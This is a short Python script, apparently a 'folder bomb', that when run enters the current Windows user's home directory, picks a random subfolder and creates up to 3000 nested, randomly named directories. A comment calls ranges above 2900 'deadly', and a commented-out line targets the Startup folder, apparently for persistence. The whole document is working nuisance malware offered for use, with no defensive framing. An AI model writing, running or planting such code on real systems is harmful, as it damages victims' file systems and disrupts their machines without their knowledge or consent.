from pathlib import Path
import getpass
import random
import os

prefix = "0x00"

os.chdir(r"C:\Users")
os.chdir(getpass.getuser())
print(os.getcwd())

# os.chdir(r"F:")


# os.chdir(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

def Foldername_Gen():

    foldername = random.randrange(111111111,999999999)  #--> set range high to avoid conflicting folder names
    foldername = prefix+str(foldername)
    return foldername

def Bomb():

    Dirlist=(next(os.walk('.'))[1])
    # print("Directory List",Dirlist)
    RandDirSel = random.choice(Dirlist)
    print("\nselected directory--> "+RandDirSel)
    os.chdir(RandDirSel)

    try:
        foldername=Foldername_Gen()
        os.mkdir(foldername)
        os.chdir(foldername)
    except:
        pass

    for x in range (3000):                                 #--> range above 2900 is deadly 
        
        try:
            foldername=Foldername_Gen()
            os.mkdir(foldername)
            os.chdir(foldername)
        except Exception as e:
            print("Second Try Block--> ",e)
            try:
                # os.chdir("folderbomb")
                print("\nit came here 1")
                Dirlist=(next(os.walk('.'))[1])
                print("Directory List",Dirlist)
                RandDirSel = random.choice(Dirlist)
                print("\nselected directory--> "+RandDirSel)
                os.chdir(RandDirSel)                  #--> tries to bomb existing folder by name folderbomb
                foldername=Foldername_Gen()
                
            except Exception as e:
                print("Second Try Block--> ",e)

            try:
                print("\nit came here 2")
                os.mkdir(foldername)                    #--> folder will not be created if it already exists 
                print(foldername,x,"success")           #--> prints name of the created folder
                
            except Exception as e:
                print("Third Try Block--> ",e)
                try:
                    print("it made it come here in the end")                                        #--> control comes here if foldername already exists
                    os.mkdir(Foldername_Gen())              #--> creates folder by directly calling Foldername_Gen()
                    print(foldername,x,"success second try")           #--> prints name of the created folder
                    
                except Exception as e:
                    print("Fourth Try Block--> ",e)

Bomb()
print("\n\nboom!\n")